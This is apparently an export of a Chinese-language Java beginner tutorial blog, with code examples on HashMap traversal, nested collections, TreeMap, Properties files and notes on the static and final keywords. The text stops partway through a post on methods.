class="hljs-title function_">showMap03</span><span class="hljs-params">(HashMap&lt;String,Student&gt; hm)</span> &#123;<br>        Set&lt;Map.Entry&lt;String, Student&gt;&gt; es = hm.entrySet();<span class="hljs-comment">//取出对键值对的对象</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Student&gt; e : es) &#123;<span class="hljs-comment">//遍历每个键值对对象</span><br>            System.out.println(e.getKey() + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + e.getValue().getName() + <span class="hljs-string">&quot;--&gt;&quot;</span> + e.getValue().getAge());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMap02</span><span class="hljs-params">(HashMap&lt;String,Student&gt; hm)</span> &#123;<br>        Set&lt;String&gt; keySet = hm.keySet();<span class="hljs-comment">//取出键的Set集合</span><br>        <span class="hljs-keyword">for</span> (String key : keySet) &#123;<span class="hljs-comment">//遍历每个学生的学号</span><br>            <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> hm.get(key);<span class="hljs-comment">//通过学号取出学生对象</span><br>            System.out.println(key + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + stu.getName() + <span class="hljs-string">&quot;--&gt;&quot;</span> + stu.getAge());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMap01</span><span class="hljs-params">(HashMap&lt;String,Student&gt; hm)</span> &#123;<br>        Collection&lt;Student&gt; values = hm.values();<br>        <span class="hljs-keyword">for</span> (Student stu : values) &#123;<br>            System.out.println(stu.getName() + <span class="hljs-string">&quot;--&gt;&quot;</span> + stu.getAge());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="83d9596b"></a></p><h3 id="6-6-集合的嵌套使用"><a href="#6-6-集合的嵌套使用" class="headerlink" title="6.6 - 集合的嵌套使用"></a>6.6 - 集合的嵌套使用</h3><ul><li>ArrayList集合中存储HashMap集合</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  集合的嵌套使用  ArrayList集合中存储HashMap集合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ArrayList&lt;HashMap&lt;String, String&gt;&gt; arrList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建ArrayList集合</span><br><br>        HashMap&lt;String, String&gt; hm01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;String, String&gt; hm02 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;String, String&gt; hm03 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//双列集合中设置元素</span><br>        hm01.put(<span class="hljs-string">&quot;郭德纲&quot;</span>,<span class="hljs-string">&quot;于谦&quot;</span>);<br>        hm01.put(<span class="hljs-string">&quot;岳云鹏&quot;</span>,<span class="hljs-string">&quot;孙越&quot;</span>);<br>        hm01.put(<span class="hljs-string">&quot;牛群&quot;</span>,<span class="hljs-string">&quot;冯巩&quot;</span>);<br><br>        hm02.put(<span class="hljs-string">&quot;王宝强&quot;</span>,<span class="hljs-string">&quot;马蓉&quot;</span>);<br>        hm02.put(<span class="hljs-string">&quot;文章&quot;</span>,<span class="hljs-string">&quot;马伊琍&quot;</span>);<br>        hm02.put(<span class="hljs-string">&quot;许凯威&quot;</span>,<span class="hljs-string">&quot;杨幂&quot;</span>);<br><br>        hm03.put(<span class="hljs-string">&quot;雷公&quot;</span>,<span class="hljs-string">&quot;电母&quot;</span>);<br>        hm03.put(<span class="hljs-string">&quot;玉皇大帝&quot;</span>,<span class="hljs-string">&quot;王母娘娘&quot;</span>);<br>        hm03.put(<span class="hljs-string">&quot;土地公&quot;</span>,<span class="hljs-string">&quot;土地婆&quot;</span>);<br><br>        <span class="hljs-comment">//将双列集合存储到ArrayList集合中</span><br>        arrList.add(hm01);<br>        arrList.add(hm02);<br>        arrList.add(hm03);<br><br>        <span class="hljs-comment">//遍历集合</span><br>        showList01(arrList);<span class="hljs-comment">//keySet</span><br>        System.out.println(<span class="hljs-string">&quot;---------------------&quot;</span>);<br>        showList02(arrList);<span class="hljs-comment">//entrySet</span><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showList02</span><span class="hljs-params">(ArrayList&lt;HashMap&lt;String, String&gt;&gt; arrList)</span> &#123;<br>        <span class="hljs-keyword">for</span> (HashMap&lt;String, String&gt; hm : arrList) &#123;<span class="hljs-comment">//遍历外层单列集合，取出每个双列集合对象</span><br>            Set&lt;Map.Entry&lt;String, String&gt;&gt; es = hm.entrySet();<span class="hljs-comment">//取出每个集合的每对键值对对象存放到set集合中</span><br>                <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; e : es) &#123;<span class="hljs-comment">//遍历每个双列集合中的每对键值对对象</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>                    System.out.println(key + <span class="hljs-string">&quot;---&quot;</span> + value);<br>                &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showList01</span><span class="hljs-params">(ArrayList&lt;HashMap&lt;String, String&gt;&gt; arrList)</span> &#123;<br>        <span class="hljs-keyword">for</span> (HashMap&lt;String, String&gt; hm : arrList) &#123;<span class="hljs-comment">//遍历外层单列集合，取出每个双列集合对象</span><br>            Set&lt;String&gt; keySet = hm.keySet();<span class="hljs-comment">//取出每个双列集合的键的Set集合</span><br>            <span class="hljs-keyword">for</span> (String key : keySet) &#123;<span class="hljs-comment">//取出每个集合的键</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> hm.get(key);<span class="hljs-comment">//通过键获取值</span><br>                System.out.println(key + <span class="hljs-string">&quot;---&quot;</span> + value);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="44d5ca25"></a></p><h3 id="6-7-TreeMap"><a href="#6-7-TreeMap" class="headerlink" title="6.7 - TreeMap"></a>6.7 - TreeMap</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.TreeMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  TreeMap</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/*TreeMap&lt;String, String&gt; map = new TreeMap&lt;&gt;();//创建TreeMap集合</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        map.put(&quot;Andy&quot;,&quot;广东&quot;);</span><br><span class="hljs-comment">        map.put(&quot;Jack&quot;,&quot;香港&quot;);</span><br><span class="hljs-comment">        map.put(&quot;Tom&quot;,&quot;厦门&quot;);</span><br><span class="hljs-comment">        map.put(&quot;Bob&quot;,&quot;上海&quot;);</span><br><span class="hljs-comment">        map.put(&quot;Lucy&quot;,&quot;北京&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        //当键为字母时，按照字典顺序进行排序</span><br><span class="hljs-comment">        System.out.println(map);*/</span><br><br>        TreeMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br><br>        map.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;广东&quot;</span>);<br>        map.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;香港&quot;</span>);<br>        map.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;厦门&quot;</span>);<br>        map.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;上海&quot;</span>);<br>        map.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;北京&quot;</span>);<br><br>        <span class="hljs-comment">//当键为数字时，按照键的升序方式排序</span><br>        System.out.println(map);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="2973730d"></a></p><h3 id="6-8-案例"><a href="#6-8-案例" class="headerlink" title="6.8 - 案例"></a>6.8 - 案例</h3><ul><li>统计字符串中字符出现的数量</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  统计字符串中字符出现的数量   Hello</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;请输入一个字符串：&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in).nextLine();<span class="hljs-comment">//获取用户的键盘输入的字符串</span><br><br>        <span class="hljs-comment">//使用键存储字符串中每个字符    使用值存储字符出现的数量</span><br>        HashMap&lt;Character, Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; line.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> line.charAt(i);<span class="hljs-comment">//将字符作为键</span><br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> map.get(key);<span class="hljs-comment">//去Map集合中找键所对应的值（数量）</span><br>            <span class="hljs-keyword">if</span>(count == <span class="hljs-literal">null</span>)&#123;<span class="hljs-comment">//如果键不存在，则会返回null类型，表示该字符没有出现过，是第一次出现</span><br>                map.put(key,<span class="hljs-number">1</span>);<span class="hljs-comment">//key在集合中没有出现过，则赋值初始值为1，表示第一次出现</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                map.put(key,++count);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//遍历集合</span><br>        Set&lt;Character&gt; keySet = map.keySet();<span class="hljs-comment">//获取键的Set集合</span><br>        <span class="hljs-keyword">for</span> (Character key : keySet) &#123;<br>            System.out.println(key + <span class="hljs-string">&quot;:&quot;</span> +map.get(key) + <span class="hljs-string">&quot;个&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="4630737a"></a></p><h2 id="7-Properties"><a href="#7-Properties" class="headerlink" title="7 - Properties"></a>7 - Properties</h2><blockquote><p>Properties类位于java.util工具类中，是Java配置文件所使用的类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Properties;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Properties</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<span class="hljs-comment">//创建配置文件对象</span><br><br>        <span class="hljs-comment">//设置配置文件信息</span><br>        prop.setProperty(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-string">&quot;黄固&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-string">&quot;欧阳锋&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-string">&quot;段智兴&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-string">&quot;洪七公&quot;</span>);<br><br>        <span class="hljs-comment">//遍历方式</span><br>        Set&lt;String&gt; keySet = prop.stringPropertyNames();<span class="hljs-comment">//与Map集合中keySet方法相同</span><br>        <span class="hljs-keyword">for</span> (String key : keySet) &#123;<br>            System.out.println(key + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + prop.getProperty(key));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>加载和存储配置文件信息</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Properties加载和存储配置文件信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<span class="hljs-comment">//构造配置文件类的对象</span><br><br><span class="hljs-comment">//        mySave(prop,&quot;./myConf.ini&quot;);</span><br>        myLoad(prop,<span class="hljs-string">&quot;./myConf.ini&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将配置文件中的信息加载到内存中来</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> prop</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> src</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">myLoad</span><span class="hljs-params">(Properties prop, String src)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(src);<span class="hljs-comment">//构造字符输入流读数据</span><br>        prop.load(fr);<br>        fr.close();<br><br>        <span class="hljs-comment">//遍历配置信息</span><br>        Set&lt;String&gt; keySet = prop.stringPropertyNames();<span class="hljs-comment">//取出键的Set集合</span><br>        <span class="hljs-keyword">for</span> (String key : keySet) &#123;<span class="hljs-comment">//遍历每个键</span><br>            System.out.println(key + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + prop.getProperty(key));<br>        &#125;<br>    &#125;<br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mySave</span><span class="hljs-params">(Properties prop, String src)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        prop.setProperty(<span class="hljs-string">&quot;USERNAME&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;PASSWORD&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;DATABASE&quot;</span>,<span class="hljs-string">&quot;YX2209&quot;</span>);<br>        prop.setProperty(<span class="hljs-string">&quot;PORT&quot;</span>,<span class="hljs-string">&quot;3306&quot;</span>);<br><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(src);<span class="hljs-comment">//构造字符流对象，与文件相关联</span><br>        prop.store(fw,<span class="hljs-string">&quot;MyDataBase Configure!~&quot;</span>);<span class="hljs-comment">//将prop对象内的配置文件信息通过流写入到文件中</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>集合</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---关键字</title>
    <link href="/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E5%85%B3%E9%94%AE%E5%AD%97/"/>
    <url>/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    
    <content type="html"><![CDATA[<h3 id="static，final关键字"><a href="#static，final关键字" class="headerlink" title="static，final关键字"></a>static，final关键字</h3><ul><li><p>static 关键字修饰变量，可以被类调用—&gt;类名.方法名</p></li><li><p>static 修饰的全局变量称为<strong>类变量</strong>。</p></li><li><p>static 修饰的自己定义的方法称为类方法。</p></li><li><p>static 修饰的代码块称为静态代码块。</p></li><li><p><strong>static</strong> <strong>修饰的方法不能被重写！！！！</strong></p></li><li><p>static 不可以修饰的内容：</p></li><li><p>static不能修改类：类惰性加载，static优先分配</p></li><li><p>static不能修饰局部变量</p></li><li><p>static不能修饰set方法 （this当前对象static类方法，不涉及对象）</p></li><li><p>static不能修饰get方法</p></li><li><p>final 关键字表示最终的，不能修改。</p></li><li><p>final 修饰的数据只能看，不能改(普通变量)</p></li><li><p>但是final修饰的类是一个最终的类，不能修改的类，子类继承了父类，基于父类进行了扩展，相当于对父类进行的修改，final修饰的类不能被继承</p></li><li><p>final可以修饰全局变量</p><ul><li>全局变量赋值方式：<ul><li>（1）定义变量时，进行final变量的赋值</li><li>（2）final 普通的变量，只能通过对象进行使用，必须创建了对象，才能使用final修饰的变量。只要创建对象，调用构造方法，对象创建成功，通过对象使用变量，使用final类型的变量前，给变量赋值了，就不影响变量的使用。创建对象时，给final变量赋值可以再构造方法中赋值，保证所有的构造方法中，都有给final变量赋值的逻辑</li><li>（3）可以再构造代码块中赋值&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》代码块执行顺序</li></ul></li></ul></li><li><p>final修饰局部变量</p><ul><li>（1）final可以修饰getset，但是一般不这么用 </li><li>（2）final可以修饰我们自己定义的方法，不能被重写</li><li>（3）final表示最终的，子类重写父类的方法，对父类中方法覆盖，相当于修改，final修饰的类不能被继承，修饰的方法不能被重写</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>Java关键字</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---方法</title>
    <link href="/2020/05/06/JavaSe%E5%9F%BA%E7%A1%80---%E6%96%B9%E6%B3%95/"/>
    <url>/2020/05/06/JavaSe%E5%9F%BA%E7%A1%80---%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="1-方法概述"><a href="#1-方法概述" class="headerlink" title="1.方法概述"></a>1.方法概述</h2><ul><li>我们先不讲方法是什么，先来看一段代码，分析以下程序存在哪些缺点，应该如何去改进：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">需求：</span><br><span class="hljs-comment">为两个数字，提供求和，以及以指定的方式在控制台打印</span><br><span class="hljs-comment">打印的方式是：a+b=c</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>System.out.println(a1+<span class="hljs-string">&quot;+&quot;</span>+b1+<span class="hljs-string">&quot;=&quot;</span>+(a1+b1));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">需求：</span><br><span class="hljs-comment">为两个数字，提供求和，以及以指定的方式在控制台打印</span><br><span class="hljs-comment">打印的方式是：a+b=c</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a2</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>System.out.println(a1+<span class="hljs-string">&quot;+&quot;</span>+b1+<span class="hljs-string">&quot;=&quot;</span>+(a1+b1));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">需求：</span><br><span class="hljs-comment">为两个数字，提供求和，以及以指定的方式在控制台打印</span><br><span class="hljs-comment">打印的方式是：a+b=c</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a3</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-number">2000</span>;<br>System.out.println(a1+<span class="hljs-string">&quot;+&quot;</span>+b1+<span class="hljs-string">&quot;=&quot;</span>+(a1+b1));<br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181455513.png"></li><li>以上代码完成了三个求和的功能，每一次求和的时候都把代码重新写了一遍，显然代码没有得到“重复利用”，表面上看是三个功能，但实际上只是“一个”求和功能，只不过每一次参与求和的实际数值不同。<br>我们现在需要一种方式能让我们把功能性代码写一次，然后给这个功能性代码传递不同的数据，来完成对应的功能。</li><li>这就需要我们掌握 java 语言中的方法机制，接下来大家看看改进之后的代码：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">a1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>add(a1,b1);<br> <br><span class="hljs-type">int</span> <span class="hljs-variable">a2</span> <span 